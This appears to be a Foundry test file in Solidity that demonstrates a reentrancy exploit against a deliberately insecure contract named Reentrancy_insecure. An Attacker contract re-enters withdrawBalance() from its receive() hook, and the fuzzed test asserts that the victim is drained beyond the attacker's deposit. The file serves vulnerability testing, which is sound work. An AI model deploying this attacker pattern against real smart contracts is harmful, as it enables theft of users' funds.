
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {stdStorage, StdStorage} from "../lib/forge-std/src/StdStorage.sol";
import {Reentrancy_insecure} from "../src/Reentrancy_insecure.sol";

contract TestReentrancyReentrancy_insecure is Test {
    using stdStorage for StdStorage;

    Reentrancy_insecure public _contractUnderTest;
    Attacker public _attacker;

    function setUp() public {
        _contractUnderTest = new Reentrancy_insecure();
        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        
        // --- 1. Constraints & Pitfall Avoidance ---
        vm.assume(attackVal > 0);
        vm.assume(attackVal <= type(uint128).max / 4);

        // --- 2. State Configuration (Pre-Condition) ---
        // Set the attacker's balance in the victim contract using stdstore
        // The userBalances mapping is at slot 0
        stdStorage
            .target(address(_contractUnderTest))
            .sig("userBalances(address)")
            .with_key(address(_attacker))
            .checked_write(attackVal);

        // --- 3. Funding ---
        // Fund the Victim contract with enough ETH to be drained (2x attackVal for reentrancy)
        vm.deal(address(_contractUnderTest), attackVal * 2);
        
        // Fund the Attacker contract
        vm.deal(address(_attacker), attackVal);

        // Fund the Test Contract
        vm.deal(address(this), attackVal * 2);

        // --- 4. Trigger Attack ---
        _attacker.setupAttack(attackVal);
        _attacker.attack(attackVal);

        // --- 5. Verify Success ---
        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}
}

contract Attacker {
    Reentrancy_insecure public victim;
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public initialVictimBalance;
    uint256 public storedAttackVal;

    constructor(address victimAddress) { 
        victim = Reentrancy_insecure(victimAddress);
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 0;
        exploitSucceeded = false;
        storedAttackVal = val;
    }

    function attack(uint256 val) public {
        // 1. Capture Initial State
        initialVictimBalance = address(victim).balance;
        uint256 initialAttackerBalance = address(this).balance;
        storedAttackVal = val;

        // 2. Call the vulnerable function
        victim.withdrawBalance();

        // 3. Verify Success Conditions
        // The attack succeeded if:
        // - We were called back (attackCallCount > 1)
        // - We received more than our initial deposit
        uint256 finalAttackerBalance = address(this).balance;
        if (attackCallCount > 1 && finalAttackerBalance > initialAttackerBalance + storedAttackVal) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        attackCallCount++;
        if (attackCallCount < 2 && address(victim).balance >= storedAttackVal) {            
            // Re-enter the vulnerable function
            victim.withdrawBalance();
        }
    }
}
